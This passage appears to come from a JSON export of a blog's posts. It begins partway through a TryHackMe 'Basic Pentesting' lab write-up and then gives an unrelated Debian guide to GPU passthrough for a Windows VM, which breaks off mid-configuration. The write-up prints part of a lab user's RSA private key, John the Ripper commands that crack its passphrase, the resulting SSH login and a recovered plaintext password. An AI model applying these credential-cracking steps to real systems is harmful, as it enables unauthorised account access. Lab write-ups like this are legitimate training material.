OsCP/iugxt7u+91J7qov/RBTrO7GeyX5Lc/SW1j6T6sjKEga8m9fS10h4TErePkT t/CCVLBkM22Ewao8glguHN5VtaNH0mTLnpjfNLVJCDHl0hKzi3zZmdrxhql+/WJQ 4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC 3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY -----END RSA PRIVATE KEY----- jan@basic2:/home/kay/.ssh$ We use JohnTheRipper to crack this hash and find the passphrase for the private ssh key for the user kay.\n/usr/share/john/ssh2john.py kay_private_key \u0026gt; john_file john john_file --wordlist=/usr/share/wordlist/rockyou.txt Output:\njohn john_file --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status beeswax (kay_private_key) Warning: Only 2 candidates left, minimum 4 needed for performance. 1g 0:00:00:03 DONE (2020-03-25 15:44) 0.2865g/s 4109Kp/s 4109Kc/s 4109KC/sa6_123..*7¡Vamos! Session completed We got the passphrase beeswax\nNow we can login as the user Kay. We need to set the permissions of the private_rsa_key file for Kay to root only.\nchmod 600 kay_private_key ssh -i kay_private_key kay@10.10.230.216 Enter passphrase for key 'kay_private_key': Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102 kay@basic2:~$ Aaand, we are in! Now we can read the passwd backup file that we saw earlier\nkay@basic2:~$ ll total 48 drwxr-xr-x 5 kay kay 4096 Apr 23 2018 ./ drwxr-xr-x 4 root root 4096 Apr 19 2018 ../ -rw------- 1 kay kay 756 Apr 23 2018 .bash_history -rw-r--r-- 1 kay kay 220 Apr 17 2018 .bash_logout -rw-r--r-- 1 kay kay 3771 Apr 17 2018 .bashrc drwx------ 2 kay kay 4096 Apr 17 2018 .cache/ -rw------- 1 root kay 119 Apr 23 2018 .lesshst drwxrwxr-x 2 kay kay 4096 Apr 23 2018 .nano/ -rw------- 1 kay kay 57 Apr 23 2018 pass.bak -rw-r--r-- 1 kay kay 655 Apr 17 2018 .profile drwxr-xr-x 2 kay kay 4096 Apr 23 2018 .ssh/ -rw-r--r-- 1 kay kay 0 Apr 17 2018 .sudo_as_admin_successful -rw------- 1 root kay 538 Apr 23 2018 .viminfo kay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ Voila! We got our final password!\n","id":13,"section":"writeups","summary":"Task 1: 1. Deploy the machine and connect to our network We deploy the machine and connect to the vpn network using openvpn\nsudo openvpn [your generated .ovpn file] 2. Find the services exposed by the machine We use our usual nmap scan with service detection for scanning:\nnmap -sC -sV -oA nmap-out 10.10.174.122 Output:\n# Nmap 7.80 scan initiated Wed Mar 25 00:13:59 2020 as: nmap -sC -sV -oN nmap-out 10.","tags":null,"title":"TryHackMe - Basic Pentesting Writeup","uri":"https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-basic-pentesting-writeup/","year":"2020"},{"content":"Preamble This guide shows how to passthrough a gpu to a vm running on QEMU/KVM on linux for improved graphical performance. In my case, I did it to run windows and play games while I can still work on my linux machine. Dual booting is not a good solution in this case as rebooting into windows just for the purpose of gaming is a pain. Passing through my gpu, I can switch between games and work with muxh ease. This is a guide of how I set it up on my machine running Debian 10.\nIntroduction to VFIO and PCI passthrough: Virtual Function IO (or VFIO) allows a virtual machine (VM) direct access to a pci hardware resource, such as a graphics processing unit (GPU). Virtual machines with set up GPU passthrough can gain close to bare metal performance, which makes running games in a Windows virtual machine possible.\nUnfortunately, the setup process can be pretty complex. It consists of fixed base settings, some variable settings and several optional (mostly performance) settings. In order to sustain readability of this post, and because I aim to use the virtual machine for gaming only, I minimized the variable parts for latency optimization. The variable topics itself are linked in articles – I hope this makes sense. 🙂\nRequirements: Hardware: In order to successfully follow this guide, it is mandatory that the used hardware supports virtualization and IOMMU groups.\nThe hardware I use is as follows:\n Ryzen 6 2600 @ 4.00Ghz MSI X470 Gaming Plus 24gb corsair vengeance 3200Mhz cl16 RAM 240GB WD Green SSD for vm NVIDIA GT710 (host gpu) AMD Radeon RX580 (passthrough gpu)  Software: Before we start, install the virtualization manager and related software via:\n1sudo apt-get install libvirt-bin bridge-utils virt-manager qemu-kvm ovmf Setting up the vfio ryzen passthrough: Devices connected to the mainboard, are members of (IOMMU) groups – depending on where and how they are connected. It is possible to pass devices into a virtual machine. Passed through devices have nearly bare metal performance when used inside the VM.\nOn the downside, passed through devices are isolated and thus no longer available to the host system. Furthermore it is only possible to isolate all devices of one IOMMU group at the same time. This means, even when not used in the VM if a devices is IOMMU-group sibling of a passed through device, it can not be used on the host system.\nEnabling the IOMMU feature: To enable the IOMMU feature on an AMD Ryzen system, modify your grub config. Run sudo nano /etc/default/grub and edit the line which starts with GRUB_CMDLINE_LINUX_DEFAULT, to match:\n1GRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;amd_iommu=on iommu=pt kvm_amd.npt=1 kvm_amd.avic=1\u0026#34; in case you are using an Intel CPU the line should read:\n1GRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;intel_iommu=on\u0026#34; Save the changes and update grub.\n1sudo update-grub Reboot your system when the command has finished.\nOne can verify after a system start if IOMMU is enabled by running:\n1dmesg |grep AMD-Vi My output:\n1[ 0.758804] AMD-Vi: IOMMU performance counters supported 2[ 0.760735] AMD-Vi: Found IOMMU at 0000:00:00.2 cap 0x40 3[ 0.760737] AMD-Vi: Extended features (0xf77ef22294ada): 4[ 0.760741] AMD-Vi: Interrupt remapping enabled 5[ 0.760742] AMD-Vi: virtual APIC enabled 6[ 0.760832] AMD-Vi: Lazy IO/TLB flushing enabled Finding the iommu group of the guest gpu to isolate: In order to activate the hardware passthrough for virtual machines, we have to make sure the nvidia/amd driver is not taking ownership of the PCIe devices; isolate it before we can hand it over.\nThis is done by applying the vfio-pci to the guest GPU, during the system startup.\nDepending on the PCIe slot installed, the hardware has different IOMMU group affilation. One can use a bash script like this in order to determine devices and their grouping:\n1#!/bin/bash 2shopt -s nullglob 3for d in /sys/kernel/iommu_groups/*/devices/*; do 4 n=${d#*/iommu_groups/*}; n=${n%%/*} 5 printf \u0026#39;IOMMU Group %s \u0026#39; \u0026#34;$n\u0026#34; 6 lspci -nns \u0026#34;${d##*/}\u0026#34; 7done; Output:\n1IOMMU Group 0 00:01.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 2Family 17h PCIe Dummy Host Bridge [1022:1452] 3IOMMU Group 10 00:08.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 4Family 17h Internal PCIe GPP Bridge 0 to Bus B [1022:1454] 5IOMMU Group 11 00:14.0 SMBus [0c05]: Advanced Micro Devices, Inc. [AMD] FCH 6SMBus Contro(rev 59) 7IOMMU Group 11 00:14.3 ISA bridge [0601]: Advanced Micro Devices, Inc. [AMD] 8FCH LPC Brirev 51) 9IOMMU Group 12 00:18.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 10Family 17h Data Fabric: Device 18h; Function 0 [1022:1460] 11IOMMU Group 12 00:18.1 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 12Family 17h Data Fabric: Device 18h; Function 1 [1022:1461] 13IOMMU Group 12 00:18.2 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 14Family 17h Data Fabric: Device 18h; Function 2 [1022:1462] 15IOMMU Group 12 00:18.3 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 16Family 17h Data Fabric: Device 18h; Function 3 [1022:1463] 17IOMMU Group 12 00:18.4 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 18Family 17h Data Fabric: Device 18h; Function 4 [1022:1464] 19IOMMU Group 12 00:18.5 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 20Family 17h Data Fabric: Device 18h; Function 5 [1022:1465] 21IOMMU Group 12 00:18.6 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 22Family 17h Data Fabric: Device 18h; Function 6 [1022:1466] 23IOMMU Group 12 00:18.7 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 24Family 17h Data Fabric: Device 18h; Function 7 [1022:1467] 25IOMMU Group 13 03:00.0 USB controller [0c03]: Advanced Micro Devices, Inc. 26[AMD] Device 01) 27IOMMU Group 13 03:00.1 SATA controller [0106]: Advanced Micro Devices, Inc. 28[AMD] 400 Se Controller [1022:43c8] (rev 01) 29IOMMU Group 13 03:00.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 30400 Series ge [1022:43c6] (rev 01) 31IOMMU Group 13 16:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 32400 Series [1022:43c7] (rev 01) 33IOMMU Group 13 16:01.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 34400 Series [1022:43c7] (rev 01) 35IOMMU Group 13 16:02.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 36400 Series [1022:43c7] (rev 01) 37IOMMU Group 13 16:03.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 38400 Series [1022:43c7] (rev 01) 39IOMMU Group 13 16:04.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 40400 Series [1022:43c7] (rev 01) 41IOMMU Group 13 16:08.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 42400 Series [1022:43c7] (rev 01) 43IOMMU Group 13 18:00.0 Ethernet controller [0200]: Realtek Semiconductor Co., 44Ltd. RTL81Express Gigabit Ethernet Controller [10ec:8168] (rev 15) 45IOMMU Group 13 1c:00.0 USB controller [0c03]: ASMedia Technology Inc. ASM1143 46USB 3.1 Ho21:1343] 47IOMMU Group 14 1d:00.0 VGA compatible controller [0300]: NVIDIA Corporation 48GK208 [GeFor:128b] (rev a1) 49IOMMU Group 14 1d:00.1 Audio device [0403]: NVIDIA Corporation GK208 HDMI/DP 50Audio Contr (rev a1) 51IOMMU Group 15 1e:00.0 VGA compatible controller [0300]: Advanced Micro 52Devices, Inc. [A [Radeon RX 470/480] [1002:67df] (rev e7) 53IOMMU Group 15 1e:00.1 Audio device [0403]: Advanced Micro Devices, Inc. 54[AMD/ATI] EllesRadeon RX 470/480 / 570/580/590] [1002:aaf0] 55IOMMU Group 16 1f:00.0 Non-Essential Instrumentation [1300]: Advanced Micro 56Devices, IncRaven/Raven2 PCIe Dummy Function [1022:145a] 57IOMMU Group 17 1f:00.2 Encryption controller [1080]: Advanced Micro Devices, 58Inc. [AMD] s 00h-0fh) Platform Security Processor [1022:1456] 59IOMMU Group 18 1f:00.3 USB controller [0c03]: Advanced Micro Devices, Inc. 60[AMD] USB 3.0[1022:145f] 61IOMMU Group 19 20:00.0 Non-Essential Instrumentation [1300]: Advanced Micro 62Devices, IncRenoir PCIe Dummy Function [1022:1455] 63IOMMU Group 1 00:01.3 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 64Family 17h (CIe GPP Bridge [1022:1453] 65IOMMU Group 20 20:00.2 SATA controller [0106]: Advanced Micro Devices, Inc. 66[AMD] FCH SACI mode] [1022:7901] (rev 51) 67IOMMU Group 21 20:00.3 Audio device [0403]: Advanced Micro Devices, Inc. [AMD] 68Family 17) HD Audio Controller [1022:1457] 69IOMMU Group 2 00:02.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 70Family 17h PCIe Dummy Host Bridge [1022:1452] 71IOMMU Group 3 00:03.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 72Family 17h PCIe Dummy Host Bridge [1022:1452] 73IOMMU Group 4 00:03.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 74Family 17h (CIe GPP Bridge [1022:1453] 75IOMMU Group 5 00:03.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 76Family 17h (CIe GPP Bridge [1022:1453] 77IOMMU Group 6 00:04.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 78Family 17h PCIe Dummy Host Bridge [1022:1452] 79IOMMU Group 7 00:07.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 80Family 17h PCIe Dummy Host Bridge [1022:1452] 81IOMMU Group 8 00:07.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 82Family 17h (nternal PCIe GPP Bridge 0 to Bus B [1022:1454] 83IOMMU Group 9 00:08.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] 84Family 17h PCIe Dummy Host Bridge [1022:1452] We are looking for the device id of the guest GPU (in my case, Radeon RX 470/480) for isolation. Keep in mind that the GPU usually comes combined with an audio device.\nWe will isolate the GPU in PCIe slot 2, with host gpu in PCIe slot 1.\nFor the next step only the GPU-Id is needed. We have to isolate 1002:67df and 1002:aaf0\nIsolation of guest gpu In order to isolate the gfx card modify /etc/initramfs-tools/modules via: sudo nano /etc/initramfs-tools/modules and add:\n1softdep amdgpu pre: vfio vfio_pci 2vfio vfio_iommu_type1 vfio_virqfd vfio_pci ids=1002:67df,1002:aaf0 modify /etc/modules aswell via: sudo nano /etc/modules and add:\n1vfio 2vfio_iommu_type1 3vfio_pci ids=1002:67df,1002:aaf0 These changes will pass device-ids to the vfio_pci module, in order to reserve these devices for the passthrough. It is crucial that the vfio_pci module claims the GPU before the actual driver (in this case the nvidia graphic-cards driver) loads, otherwise it is not possible to isolate the GPU. Make sure your cards are using the Nvidia driver (not nouvea one).\nIn order to alter the load sequence in favour to vfio_pci before the nvidia driver, create a file in the modprobe.d folder via sudo nano /etc/modprobe.d/nvidia.conf and add the the following line:\n1softdep nouveau pre: vfio-pci 2softdep nvidia pre: vfio-pci 3softdep nvidia* pre: vfio-pci Create another file via sudo nano /etc/modprobe.d/vfio.conf to add the the following line:\n1options vfio-pci ids=1002:67df,1002:aaf0 Obviously, the ids have to be the same we have added before to the modules file. Now save and close the file.\nSince the Windows 10 update 1803 the following additional entry needs to be set (otherwise BSOD) create the kvm.conf file via sudo nano /etc/modprobe.d/kvm.conf to add the the following line:\n1options kvm ignore_msrs=1 Save and close the file.\n1when all is done run: sudo update-initramfs -u -k all Verify the isolation In order to verify a proper isolation of the device, run:\n1lspci -nnv find the line \u0026quot;Kernel driver in use\u0026quot; for the GPU and its audio part. It should state vfio-pci.\nMy output:\n11e:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. 2[AMD/ATI] Ellesmere [Radeon RX 470/480] [1002:67df] (rev e7) (prog-if 00 [VGA 3controller]) 4 Subsystem: Sapphire Technology Limited Ellesmere [Radeon RX 5470/480/570/570X/580/580X/590] (Nitro+ Radeon RX 570/580) [1da2:e366] 6 Flags: fast devsel, IRQ 11 7 Memory at d0000000 (64-bit, prefetchable) [disabled] [size=256M] 8 Memory at e0000000 (64-bit, prefetchable) [disabled] [size=2M] 9 I/O ports at d000 [disabled] [size=256] 10 Memory at f7900000 (32-bit, non-prefetchable) [disabled] [size=256K] 11 Expansion ROM at f7940000 [disabled] [size=128K] 12 Capabilities: \u0026lt;access denied\u0026gt; 13 Kernel driver in use: vfio-pci 14 Kernel modules: amdgpu 15 161e:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Ellesmere 17HDMI Audio [Radeon RX 470/480 / 570/580/590] [1002:aaf0] 18 Subsystem: Sapphire Technology Limited Ellesmere HDMI Audio [Radeon RX 19470/480 / 570/580/590] [1da2:aaf0] 20 Flags: fast devsel, IRQ 10 21 Memory at f7960000 (64-bit, non-prefetchable) [disabled] [size=16K] 22 Capabilities: \u0026lt;access denied\u0026gt; 23 Kernel driver in use: vfio-pci 24 Kernel modules: snd_hda_intel Creating the windows virtual machine The virtualization is done via an open source machine emulator and virtualizer called QEMU. One can either run qemu directly, or use a GUI called virt-manager in order setup, and run a virtual machine. I prefer using the GUI. Unfortunately not every settings is supported in the Virtual Manager. Thus, I define the basic settings in the UI do a quick VM start and force stop it right after I see the GPU is passed-over correctly. Afterwards one can edit the missing bits into the VM config via virsh.\n  Open virt-manager\n  Create a new windows virtual machine\n  Select the iso file of windows10\n  Choose the desired amount of RAM and CPU cores\n  Create a custom storage(since we are using a wholess SSD for this vm)\n  Add a new pool\n  First, find the dev name of your ssd for vm using the command lsblk in terminal. In my case, it was /dev/sdc. You must select physical disk drive as we are using a seperate disk.\n  Build the pool\n  Next create a new volume in the pool by the name win10(or whatever you like). and select this voilume as the storage.\n  You must check the box\n  After finishing, the following box will appear. Select chipset Q35 and firmware uefi and apply.\n  In the CPUs, manually set the cpu topology with 1 socket and cores and threads as your choice, better follow usual configurations of cores/threads\n  Remove the Display spice and Video QXL from the hardwares.\n  Go to Add hardware, there yoiu will find your passthrough gpu and sound in the pci host device section. Add those.\n   A problem that I faced during installing windows is that I couldn\u0026rsquo;t boot into the iso file inserted as cd rom and got stuck on the UEFI shell. Going into the bios, I still couldn\u0026rsquo;t boot from the iso. But when I used BIOS instead of UEFI, it booted into windows installation alright, but going to install windows, it shows that my disk is GPT instead of MBR required for BIOS, and so cannot install windows to that disk.\n So, what you have to do is create a windows bootable drive with GPT. You can do this in many ways, either in linux or using a sofware like rufus on windows. Create a bootable pendrive and attach it. Now in the add hardware section, under the USB Host Device, you will find your pendrive. Add it.\n  Go to boot options, check Enable boot menu and in the serial, check and move the USB device(your bootable drive), to the top.\n  Next, start installation.\n  Install windows: Connect a second monitor to you host gpu, or you can connect to the monnitor you already have and can switch the inputs between your host and guest gpu.\nThe windows installation should come up, install windows and voila! you are done, almost\nInstall necessary drivers Performance is supposed to get better if you use virtio drivers on windows, Download the virtio drivers and attack them to the vm as a cdrom device and install the drivers from there.\nYou must also install the required graphics drivers(Radeon/NVIDIA) to eliminate display issues (in my case , I was not gettint the 1080p resolution).\nEditing configurations using virsh You can edit the config of your vm from terminal by editing the xml file generate, To edit the xml file, in the termial, type virsh edit win10 In place if win10, place the name of your windows vm.\n1\u0026lt;domain type=\u0026#39;kvm\u0026#39;\u0026gt; 2 \u0026lt;name\u0026gt;win10\u0026lt;/name\u0026gt; 3 \u0026lt;uuid\u0026gt;ba67aec1-75a4-4639-b905-2e9c444aef85\u0026lt;/uuid\u0026gt; 4 \u0026lt;metadata\u0026gt; 5 \u0026lt;libosinfo:libosinfo 6xmlns:libosinfo=\u0026#34;http://libosinfo.org/xmlns/libvirt/domain/1.0\u0026#34;\u0026gt; 7 \u0026lt;libosinfo:os id=\u0026#34;http://microsoft.com/win/10\u0026#34;/\u0026gt; 8 \u0026lt;/libosinfo:libosinfo\u0026gt; 9 \u0026lt;/metadata\u0026gt; 10 \u0026lt;memory unit=\u0026#39;KiB\u0026#39;\u0026gt;8388608\u0026lt;/memory\u0026gt; 11 \u0026lt;currentMemory unit=\u0026#39;KiB\u0026#39;\u0026gt;8388608\u0026lt;/currentMemory\u0026gt; 12 \u0026lt;vcpu placement=\u0026#39;static\u0026#39;\u0026gt;6\u0026lt;/vcpu\u0026gt; 13 \u0026lt;os\u0026gt; 14 \u0026lt;type arch=\u0026#39;x86_64\u0026#39; machine=\u0026#39;pc-q35-3.1\u0026#39;\u0026gt;hvm\u0026lt;/type\u0026gt; 15 \u0026lt;loader readonly=\u0026#39;yes\u0026#39; type=\u0026#39;pflash\u0026#39;\u0026gt;/usr/share/OVMF/OVMF_CODE.fd\u0026lt;/loader\u0026gt; 16 \u0026lt;nvram\u0026gt;/var/lib/libvirt/qemu/nvram/win10_VARS.fd\u0026lt;/nvram\u0026gt; 17 \u0026lt;bootmenu enable=\u0026#39;yes\u0026#39;/\u0026gt; 18 \u0026lt;/os\u0026gt; 19 \u0026lt;features\u0026gt; 20 \u0026lt;acpi/\u0026gt; 21 \u0026lt;apic/\u0026gt; 22 \u0026lt;hyperv\u0026gt; 23 \u0026lt;relaxed state=\u0026#39;on\u0026#39;/\u0026gt; 24 \u0026lt;vapic state=\u0026#39;on\u0026#39;/\u0026gt; 25 \u0026lt;spinlocks state=\u0026#39;on\u0026#39; retries=\u0026#39;8191\u0026#39;/\u0026gt; 26 \u0026lt;/hyperv\u0026gt; 27 \u0026lt;vmport state=\u0026#39;off\u0026#39;/\u0026gt; 28 \u0026lt;/features\u0026gt; 29 \u0026lt;cpu mode=\u0026#39;host-model\u0026#39; check=\u0026#39;partial\u0026#39;\u0026gt; 30 \u0026lt;model fallback=\u0026#39;allow\u0026#39;/\u0026gt; 31 \u0026lt;topology sockets=\u0026#39;1\u0026#39; cores=\u0026#39;6\u0026#39; threads=\u0026#39;1\u0026#39;/\u0026gt; 32 \u0026lt;/cpu\u0026gt; 33 \u0026lt;clock offset=\u0026#39;localtime\u0026#39;\u0026gt; 34 \u0026lt;timer name=\u0026#39;rtc\u0026#39; tickpolicy=\u0026#39;catchup\u0026#39;/\u0026gt; 35 \u0026lt;timer name=\u0026#39;pit\u0026#39; tickpolicy=\u0026#39;delay\u0026#39;/\u0026gt; 36\u0026lt;timer name=\u0026#39;hpet\u0026#39; present=\u0026#39;no\u0026#39;/\u0026gt; 37 \u0026lt;timer name=\u0026#39;hypervclock\u0026#39; present=\u0026#39;yes\u0026#39;/\u0026gt; 38 \u0026lt;/clock\u0026gt; 39 \u0026lt;on_poweroff\u0026gt;destroy\u0026lt;/on_poweroff\u0026gt; 40 \u0026lt;on_reboot\u0026gt;restart\u0026lt;/on_reboot\u0026gt; 41 \u0026lt;on_crash\u0026gt;destroy\u0026lt;/on_crash\u0026gt; 42 \u0026lt;pm\u0026gt; 43 \u0026lt;suspend-to-mem enabled=\u0026#39;no\u0026#39;/\u0026gt; 44 \u0026lt;suspend-to-disk enabled=\u0026#39;no\u0026#39;/\u0026gt; 45 \u0026lt;/pm\u0026gt; 46 \u0026lt;devices\u0026gt; 47 \u0026lt;emulator\u0026gt;/usr/bin/qemu-system-x86_64\u0026lt;/emulator\u0026gt; 48 \u0026lt;disk type=\u0026#39;block\u0026#39; device=\u0026#39;disk\u0026#39;\u0026gt; 49 \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39; cache=\u0026#39;none\u0026#39; io=\u0026#39;native\u0026#39;/\u0026gt; 50 \u0026lt;source dev=\u0026#39;/dev/sdc1\u0026#39;/\u0026gt; 51 \u0026lt;target dev=\u0026#39;sda\u0026#39; bus=\u0026#39;sata\u0026#39;/\u0026gt; 52 \u0026lt;boot order=\u0026#39;2\u0026#39;/\u0026gt; 53 \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; 54 \u0026lt;/disk\u0026gt; 55 \u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; 56 \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; 57 \u0026lt;source file=\u0026#39;/home/fmash/gpu_passthru/virtio-win-0.1.141.iso\u0026#39;/\u0026gt; 58 \u0026lt;target dev=\u0026#39;sdb\u0026#39; bus=\u0026#39;sata\u0026#39;/\u0026gt; 59 \u0026lt;readonly/\u0026gt; 60 \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;1\u0026#39;/\u0026gt; 61 \u0026lt;/disk\u0026gt; 62 \u0026lt;controller type=\u0026#39;usb\u0026#39; index=\u0026#39;0\u0026#39; model=\u0026#39;qemu-xhci\u0026#39; ports=\u0026#39;15\u0026#39;\u0026gt; 63 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x02\u0026#39; slot=\u0026#39;0x00\u0026#39; 64function=\u0026#39;0x0\u0026#39;/\u0026gt; 65 \u0026lt;/controller\u0026gt; 66 \u0026lt;controller type=\u0026#39;sata\u0026#39; index=\u0026#39;0\u0026#39;\u0026gt; 67 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x1f\u0026#39; 68function=\u0026#39;0x2\u0026#39;/\u0026gt; 69 \u0026lt;/controller\u0026gt; 70 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;0\u0026#39; model=\u0026#39;pcie-root\u0026#39;/\u0026gt; 71 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;1\u0026#39; model=\u0026#39;pcie-root-port\u0026#39;\u0026gt; 72 \u0026lt;model name=\u0026#39;pcie-root-port\u0026#39;/\u0026gt; 73 \u0026lt;target chassis=\u0026#39;1\u0026#39; port=\u0026#39;0x8\u0026#39;/\u0026gt; 74\u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x01\u0026#39; function=\u0026#39;0x0\u0026#39; 75multifunction=\u0026#39;on\u0026#39;/\u0026gt; 76 \u0026lt;/controller\u0026gt; 77 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;2\u0026#39; model=\u0026#39;pcie-root-port\u0026#39;\u0026gt; 78 \u0026lt;model name=\u0026#39;pcie-root-port\u0026#39;/\u0026gt; 79 \u0026lt;target chassis=\u0026#39;2\u0026#39; port=\u0026#39;0x9\u0026#39;/\u0026gt; 80 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x01\u0026#39; 81function=\u0026#39;0x1\u0026#39;/\u0026gt; 82 \u0026lt;/controller\u0026gt; 83 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;3\u0026#39; model=\u0026#39;pcie-root-port\u0026#39;\u0026gt; 84 \u0026lt;model name=\u0026#39;pcie-root-port\u0026#39;/\u0026gt; 85 \u0026lt;target chassis=\u0026#39;3\u0026#39; port=\u0026#39;0xa\u0026#39;/\u0026gt; 86 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x01\u0026#39; 87function=\u0026#39;0x2\u0026#39;/\u0026gt; 88 \u0026lt;/controller\u0026gt; 89 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;4\u0026#39; model=\u0026#39;pcie-root-port\u0026#39;\u0026gt; 90 \u0026lt;model name=\u0026#39;pcie-root-port\u0026#39;/\u0026gt; 91 \u0026lt;target chassis=\u0026#39;4\u0026#39; port=\u0026#39;0xb\u0026#39;/\u0026gt; 92 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x01\u0026#39; 93function=\u0026#39;0x3\u0026#39;/\u0026gt; 94 \u0026lt;/controller\u0026gt; 95 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;5\u0026#39; model=\u0026#39;pcie-root-port\u0026#39;\u0026gt; 96 \u0026lt;model name=\u0026#39;pcie-root-port\u0026#39;/\u0026gt; 97 \u0026lt;target chassis=\u0026#39;5\u0026#39; port=\u0026#39;0xc\u0026#39;/\u0026gt; 98 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x01\u0026#39; 99function=\u0026#39;0x4\u0026#39;/\u0026gt; 100 \u0026lt;/controller\u0026gt; 101 \u0026lt;controller type=\u0026#39;pci\u0026#39; index=\u0026#39;6\u0026#39; model=\u0026#39;pcie-root-port\u0026#39;\u0026gt; 102 \u0026lt;model name=\u0026#39;pcie-root-port\u0026#39;/\u0026gt; 103 \u0026lt;target chassis=\u0026#39;6\u0026#39; port=\u0026#39;0xd\u0026#39;/\u0026gt; 104 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x01\u0026#39; 105function=\u0026#39;0x5\u0026#39;/\u0026gt; 106 \u0026lt;/controller\u0026gt; 107 \u0026lt;interface type=\u0026#39;network\u0026#39;\u0026gt; 108 \u0026lt;mac address=\u0026#39;52:54:00:e4:b0:ef\u0026#39;/\u0026gt; 109 \u0026lt;source network=\u0026#39;default\u0026#39;/\u0026gt; 110 \u0026lt;model type=\u0026#39;e1000e\u0026#39;/\u0026gt; 111 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x01\u0026#39; slot=\u0026#39;0x00\u0026#39; 112function=\u0026#39;0x0\u0026#39;/\u0026gt; 113 \u0026lt;/interface\u0026gt; 114 \u0026lt;serial type=\u0026#39;pty\u0026#39;\u0026gt; 115 \u0026lt;target type=\u0026#39;isa-serial\u0026#39; port=\u0026#39;0\u0026#39;\u0026gt; 116 \u0026lt;model name=\u0026#39;isa-serial\u0026#39;/\u0026gt; 117\u0026lt;/target\u0026gt; 118 \u0026lt;/serial\u0026gt; 119 